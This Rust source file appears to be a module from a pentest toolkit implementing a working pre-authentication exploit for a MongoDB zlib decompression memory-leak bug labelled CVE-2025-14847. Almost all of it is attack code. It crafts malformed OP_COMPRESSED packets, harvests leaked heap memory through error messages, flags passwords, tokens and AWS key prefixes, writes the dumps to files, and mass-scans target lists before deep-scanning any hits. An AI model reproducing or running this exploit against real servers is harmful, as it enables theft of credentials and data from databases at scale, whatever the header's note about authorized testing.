//! MongoBleed Exploit (CVE-2025-14847)
//!
//! Exploits a zlib decompression bug in MongoDB Server to leak uninitialized
//! heap memory via BSON field names.
//!
//! ## Vulnerability Details
//! - **CVE**: CVE-2025-14847 (CVSS: 8.7 Critical)
//! - **Affected**: MongoDB Server v7.0 < 7.0.28, v8.0 < 8.0.17, v8.2
//! - **Attack Vector**: Pre-authentication memory disclosure
//! - **Impact**: Credential theft, session token leakage, data exfiltration
//!
//! ## How It Works
//! MongoDB miscalculates decompression lengths when processing malformed
//! zlib-compressed messages. This causes the server to return uninitialized
//! memory in its responses, similar to "Heartbleed" in OpenSSL.
//!
//! ## References
//! - Original PoC: https://github.com/joe-desimone/mongobleed
//! - MongoDB Advisory: https://www.mongodb.com/docs/manual/release-notes/
//!
//! For authorized penetration testing only.

use anyhow::{Context, Result};
use colored::*;
use flate2::write::ZlibEncoder;
use flate2::Compression;
use regex::bytes::Regex;
use std::collections::HashSet;
use std::fs::File;
use std::io::{Read, Write};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use tokio::time::{timeout, Duration};

use crate::utils::{normalize_target, prompt_default, prompt_int_range, prompt_yes_no};

const DEFAULT_PORT: u16 = 27017;
const DEFAULT_MIN_OFFSET: u32 = 20;
const DEFAULT_MAX_OFFSET: u32 = 8192;
const DEEP_SCAN_MAX_OFFSET: u32 = 50000;
const CONNECT_TIMEOUT_SECS: u64 = 3;
const READ_TIMEOUT_SECS: u64 = 2;
const MAX_CONCURRENT_SCANS: usize = 10;

/// Display module banner
fn display_banner() {
    println!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    println!(
        "{}",
        "║             MongoBleed (CVE-2025-14847)                   ║".cyan()
    );
    println!(
        "{}",
        "║   MongoDB Memory Disclosure - Pre-Auth Exploitation      ║".cyan()
    );
    println!(
        "{}",
        "║   CVSS: 8.7 (Critical) - Active Exploitation in Wild     ║".cyan()
    );
    println!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
}

/// Scan mode selection
#[derive(Clone, Copy, PartialEq)]
enum ScanMode {
    VulnCheck,   // Quick check if vulnerable
    QuickScan,   // Fast scan with default offsets
    DeepScan,    // Extended scan for more data
    CustomScan,  // User-defined offset range
}

/// Configuration for the exploit
struct ExploitConfig {
    min_offset: u32,
    max_offset: u32,
    port: u16,
    mode: ScanMode,
    output_file: String,
}

impl Default for ExploitConfig {
    fn default() -> Self {
        Self {
            min_offset: DEFAULT_MIN_OFFSET,
            max_offset: DEFAULT_MAX_OFFSET,
            port: DEFAULT_PORT,
            mode: ScanMode::QuickScan,
            output_file: "leaked_mongo_data.bin".to_string(),
        }
    }
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).yellow());
    println!();

    // Check if target is a file (mass scan mode)
    if target.ends_with(".txt") {
        return run_mass_scan(target).await;
    }

    // Normalize and parse target
    let normalized = normalize_target(target)?;
    
    // Prompt for configuration
    let config = prompt_config().await?;
    
    // Build target address
    let target_addr = if normalized.contains(':') {
        normalized
    } else {
        format!("{}:{}", normalized, config.port)
    };

    println!();
    println!("{}", format!("[*] Target address: {}", target_addr).cyan());
    println!(
        "{}",
        format!(
            "[*] Offset range: {} - {}",
            config.min_offset, config.max_offset
        )
        .cyan()
    );

    // Run the exploit
    match config.mode {
        ScanMode::VulnCheck => run_vuln_check(&target_addr).await,
        _ => run_exploit(&target_addr, &config).await,
    }
}

/// Prompt user for configuration
async fn prompt_config() -> Result<ExploitConfig> {
    let mut config = ExploitConfig::default();

    println!("{}", "[*] Select scan mode:".cyan());
    println!("  {} Quick vulnerability check (fast)", "1.".bold());
    println!("  {} Quick scan (offsets 20-8192)", "2.".bold());
    println!("  {} Deep scan (offsets 20-50000, slower)", "3.".bold());
    println!("  {} Custom range", "4.".bold());
    println!();

    let choice = prompt_int_range("Select option", 2, 1, 4)?;

    config.mode = match choice {
        1 => ScanMode::VulnCheck,
        2 => ScanMode::QuickScan,
        3 => {
            config.max_offset = DEEP_SCAN_MAX_OFFSET;
            ScanMode::DeepScan
        }
        4 => {
            config.min_offset = prompt_int_range("Min offset", DEFAULT_MIN_OFFSET as i64, 1, 65535)? as u32;
            config.max_offset = prompt_int_range("Max offset", DEFAULT_MAX_OFFSET as i64, config.min_offset as i64, 100000)? as u32;
            ScanMode::CustomScan
        }
        _ => ScanMode::QuickScan,
    };

    // Port configuration
    let port_str = prompt_default("MongoDB port", "27017")?;
    config.port = port_str.parse().unwrap_or(DEFAULT_PORT);

    // Output file
    config.output_file = prompt_default("Output file", "leaked_mongo_data.bin")?;

    Ok(config)
}

/// Quick vulnerability check
async fn run_vuln_check(target_addr: &str) -> Result<()> {
    println!();
    println!("{}", "[*] Running quick vulnerability check...".cyan());

    // Test a few offsets to see if we get memory leaks
    let test_offsets = [100, 500, 1000, 2000];
    let mut vulnerable = false;

    for &offset in &test_offsets {
        match send_probe(target_addr, offset, offset + 500).await {
            Ok(leaks) => {
                if !leaks.is_empty() {
                    vulnerable = true;
                    println!(
                        "{}",
                        format!("[+] Leak detected at offset {}: {} bytes", offset, leaks.iter().map(|l| l.len()).sum::<usize>())
                            .green()
                            .bold()
                    );
                    break;
                }
            }
            Err(e) => {
                println!("{}", format!("[-] Connection error: {}", e).red());
                return Ok(());
            }
        }
    }

    println!();
    if vulnerable {
        println!(
            "{}",
            "[VULNERABLE] Target appears vulnerable to CVE-2025-14847!"
                .red()
                .bold()
        );
        println!(
            "{}",
            "[*] Run a full scan to extract memory data.".yellow()
        );
    } else {
        println!(
            "{}",
            "[NOT VULNERABLE] No memory leaks detected.".green()
        );
        println!(
            "{}",
            "[*] Target may be patched or not a MongoDB server.".dimmed()
        );
    }

    Ok(())
}

/// Run full exploit with memory extraction
async fn run_exploit(target_addr: &str, config: &ExploitConfig) -> Result<()> {
    println!();
    println!(
        "{}",
        format!(
            "[*] Starting scan (offsets {}-{})...",
            config.min_offset, config.max_offset
        )
        .cyan()
    );

    let mut all_leaked = Vec::new();
    let mut unique_leaks: HashSet<Vec<u8>> = HashSet::new();
    let total_offsets = config.max_offset - config.min_offset;
    let mut last_progress = 0;

    // Secrets to search for
    let secrets = [
        "password", "secret", "key", "token", "admin", "AKIA", "root",
        "auth", "credential", "apikey", "api_key", "session",
    ];
    let mut found_secrets: HashSet<String> = HashSet::new();

    for doc_len in config.min_offset..config.max_offset {
        // Progress indicator (every 5%)
        let progress = ((doc_len - config.min_offset) * 100 / total_offsets) as usize;
        if progress >= last_progress + 5 {
            last_progress = progress;
            print!("\r{}", format!("[*] Progress: {}%", progress).cyan());
            std::io::stdout().flush().ok();
        }

        match send_probe(target_addr, doc_len, doc_len + 500).await {
            Ok(leaks) => {
                for data in leaks {
                    if !unique_leaks.contains(&data) {
                        unique_leaks.insert(data.clone());
                        all_leaked.extend_from_slice(&data);

                        // Check for secrets
                        let data_str = String::from_utf8_lossy(&data).to_lowercase();
                        for s in &secrets {
                            if data_str.contains(s) && !found_secrets.contains(*s) {
                                found_secrets.insert(s.to_string());
                            }
                        }

                        // Show interesting leaks (> 10 bytes)
                        if data.len() > 10 {
                            let preview = String::from_utf8_lossy(&data).replace('\n', "\\n");
                            let preview_trunk: String = preview.chars().take(80).collect();
                            println!(
                                "\r{}",
                                format!(
                                    "[+] offset={:5} len={:4}: {}",
                                    doc_len,
                                    data.len(),
                                    preview_trunk
                                )
                                .magenta()
                            );
                        }
                    }
                }
            }
            Err(_) => {
                // Connection errors are common during exploitation, continue
            }
        }
    }

    println!("\r{}", " ".repeat(40)); // Clear progress line

    // Save results
    let mut f = File::create(&config.output_file).context("Failed to create output file")?;
    f.write_all(&all_leaked)?;

    // Print summary
    println!();
    println!("{}", "═══════════════════════════════════════════════════════════".cyan());
    println!("{}", "                      SCAN RESULTS                         ".cyan().bold());
    println!("{}", "═══════════════════════════════════════════════════════════".cyan());
    println!(
        "{}",
        format!("[*] Total leaked: {} bytes", all_leaked.len()).yellow()
    );
    println!(
        "{}",
        format!("[*] Unique fragments: {}", unique_leaks.len()).yellow()
    );
    println!(
        "{}",
        format!("[*] Saved to: {}", config.output_file).green()
    );

    // Show found secrets
    if !found_secrets.is_empty() {
        println!();
        println!("{}", "[!] SENSITIVE PATTERNS FOUND:".red().bold());
        for s in &found_secrets {
            println!("{}", format!("    • {}", s).red());
        }
        println!(
            "{}",
            "[!] Manual review of leaked data recommended!".yellow()
        );
    }

    // Recommendations
    println!();
    println!("{}", "[*] Recommendations:".cyan());
    println!("    • Review leaked.bin for credentials");
    println!("    • Search for: strings leaked_mongo_data.bin | grep -i password");
    println!("    • Rotate any exposed credentials immediately");

    Ok(())
}

/// Mass scan mode - scan multiple targets from file
async fn run_mass_scan(file_path: &str) -> Result<()> {
    println!();
    println!("{}", format!("[*] Mass scan mode: {}", file_path).cyan());

    // Read targets from file
    let content = match tokio::fs::read_to_string(file_path).await {
        Ok(c) => c,
        Err(e) => {
            eprintln!("{}", format!("[!] Failed to read file: {}", e).red());
            return Ok(());
        }
    };

    let targets: Vec<String> = content
        .lines()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty() && !s.starts_with('#'))
        .collect();

    if targets.is_empty() {
        println!("{}", "[-] No targets found in file".red());
        return Ok(());
    }

    println!(
        "{}",
        format!("[*] Loaded {} targets", targets.len()).yellow()
    );

    let deep_scan = prompt_yes_no("Run deep scan on vulnerable targets?", false)?;

    let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_SCANS));
    let vulnerable_count = Arc::new(AtomicUsize::new(0));
    let scanned_count = Arc::new(AtomicUsize::new(0));
    let total = targets.len();

    let mut handles = Vec::new();

    for target in targets {
        let permit = semaphore.clone().acquire_owned().await?;
        let vuln_count = vulnerable_count.clone();
        let scan_count = scanned_count.clone();

        let handle = tokio::spawn(async move {
            let _permit = permit;

            // Normalize target
            let target_addr = if target.contains(':') {
                target.clone()
            } else {
                format!("{}:{}", target, DEFAULT_PORT)
            };

            // Quick vuln check
            let mut is_vulnerable = false;
            for offset in [100, 500, 1000] {
                if let Ok(leaks) = send_probe(&target_addr, offset, offset + 500).await {
                    if !leaks.is_empty() {
                        is_vulnerable = true;
                        break;
                    }
                }
            }

            scan_count.fetch_add(1, Ordering::SeqCst);
            let progress = scan_count.load(Ordering::SeqCst);

            if is_vulnerable {
                vuln_count.fetch_add(1, Ordering::SeqCst);
                println!(
                    "{}",
                    format!("[VULN] {} - CVE-2025-14847", target_addr)
                        .red()
                        .bold()
                );
            } else {
                println!(
                    "{}",
                    format!("[SAFE] {} ({}/{})", target_addr, progress, total).dimmed()
                );
            }

            (target_addr, is_vulnerable)
        });

        handles.push(handle);
    }

    // Wait for all scans
    let mut vulnerable_targets = Vec::new();
    for handle in handles {
        if let Ok((addr, vuln)) = handle.await {
            if vuln {
                vulnerable_targets.push(addr);
            }
        }
    }

    // Summary
    println!();
    println!("{}", "═══════════════════════════════════════════════════════════".cyan());
    println!(
        "{}",
        format!(
            "[*] Scan complete: {}/{} vulnerable",
            vulnerable_count.load(Ordering::SeqCst),
            total
        )
        .yellow()
    );

    // Save vulnerable targets
    if !vulnerable_targets.is_empty() {
        let output = "vulnerable_mongodb.txt";
        let mut f = File::create(output)?;
        for t in &vulnerable_targets {
            writeln!(f, "{}", t)?;
        }
        println!(
            "{}",
            format!("[*] Vulnerable targets saved to: {}", output).green()
        );

        // Deep scan if requested
        if deep_scan {
            println!();
            println!("{}", "[*] Running deep scan on vulnerable targets...".cyan());
            for target in vulnerable_targets {
                let config = ExploitConfig {
                    min_offset: DEFAULT_MIN_OFFSET,
                    max_offset: DEEP_SCAN_MAX_OFFSET,
                    port: DEFAULT_PORT,
                    mode: ScanMode::DeepScan,
                    output_file: format!("leaked_{}.bin", target.replace(':', "_")),
                };
                println!();
                println!("{}", format!("[*] Deep scanning: {}", target).yellow());
                let _ = run_exploit(&target, &config).await;
            }
        }
    }

    Ok(())
}

/// Send a probe packet and extract leaks
async fn send_probe(addr: &str, doc_len: u32, buffer_size: u32) -> Result<Vec<Vec<u8>>> {
    // 1. Construct the malicious BSON payload
    // content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
    let content = b"\x10a\x00\x01\x00\x00\x00";
    let mut bson = Vec::new();
    bson.extend_from_slice(&doc_len.to_le_bytes()); // inflated doc_len
    bson.extend_from_slice(content);

    // 2. Wrap in OP_MSG (Code 2013)
    let mut op_msg = Vec::new();
    op_msg.extend_from_slice(&0u32.to_le_bytes()); // flagBits
    op_msg.push(0x00); // sectionKind
    op_msg.extend_from_slice(&bson);

    // 3. Compress using zlib
    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(&op_msg)?;
    let compressed = encoder.finish()?;

    // 4. Create OP_COMPRESSED (Code 2012) payload
    let mut payload = Vec::new();
    payload.extend_from_slice(&2013u32.to_le_bytes()); // originalOpcode
    payload.extend_from_slice(&buffer_size.to_le_bytes()); // uncompressedSize
    payload.push(2); // zlib ID
    payload.extend_from_slice(&compressed);

    // 5. Create Header
    let msg_length = 16 + payload.len() as u32;
    let mut header = Vec::new();
    header.extend_from_slice(&msg_length.to_le_bytes());
    header.extend_from_slice(&1u32.to_le_bytes()); // requestID
    header.extend_from_slice(&0u32.to_le_bytes()); // responseTo
    header.extend_from_slice(&2012u32.to_le_bytes()); // opCode (OP_COMPRESSED)

    // Connect with timeout
    let mut stream = timeout(
        Duration::from_secs(CONNECT_TIMEOUT_SECS),
        TcpStream::connect(addr),
    )
    .await
    .context("Connection timed out")??;

    // Send data
    stream.write_all(&header).await?;
    stream.write_all(&payload).await?;

    // Read response with timeout
    let mut response = Vec::new();
    let mut buf = [0u8; 4096];

    let _ = timeout(Duration::from_secs(READ_TIMEOUT_SECS), async {
        // First read
        let n = stream.read(&mut buf).await?;
        if n == 0 {
            return Ok(());
        }
        response.extend_from_slice(&buf[..n]);

        // Read remainder based on header length
        while response.len() < 4
            || (response.len() >= 4
                && response.len()
                    < u32::from_le_bytes(response[0..4].try_into().unwrap_or([0, 0, 0, 0]))
                        as usize)
        {
            let n = stream.read(&mut buf).await?;
            if n == 0 {
                break;
            }
            response.extend_from_slice(&buf[..n]);
        }
        Ok::<(), anyhow::Error>(())
    })
    .await;

    extract_leaks(&response)
}

/// Extract leaked data from response
fn extract_leaks(response: &[u8]) -> Result<Vec<Vec<u8>>> {
    if response.len() < 25 {
        return Ok(vec![]);
    }

    let opcode = u32::from_le_bytes(response[12..16].try_into().unwrap_or([0, 0, 0, 0]));

    // Decompress if OP_COMPRESSED
    let raw_data = if opcode == 2012 {
        if response.len() > 25 {
            let mut d = flate2::read::ZlibDecoder::new(&response[25..]);
            let mut buffer = Vec::new();
            if d.read_to_end(&mut buffer).is_ok() {
                buffer
            } else {
                return Ok(vec![]);
            }
        } else {
            return Ok(vec![]);
        }
    } else if response.len() > 16 {
        response[16..].to_vec()
    } else {
        return Ok(vec![]);
    };

    let mut leaks = Vec::new();

    // Search for "field name '...'" error pattern
    let re_field = Regex::new(r"field name '([^']*)'")
        .map_err(|e| anyhow::anyhow!("Regex error: {}", e))?;

    for cap in re_field.captures_iter(&raw_data) {
        if let Some(m) = cap.get(1) {
            let data = m.as_bytes().to_vec();
            // Filter common boring strings
            if data != b"?" && data != b"a" && data != b"$db" && data != b"ping" {
                leaks.push(data);
            }
        }
    }

    // Search for "type (\d+)" pattern
    let re_type = Regex::new(r"type (\d+)")
        .map_err(|e| anyhow::anyhow!("Regex error: {}", e))?;

    for cap in re_type.captures_iter(&raw_data) {
        if let Some(m) = cap.get(1) {
            if let Ok(s) = std::str::from_utf8(m.as_bytes()) {
                if let Ok(val) = s.parse::<u8>() {
                    leaks.push(vec![val]);
                }
            }
        }
    }

    Ok(leaks)
}
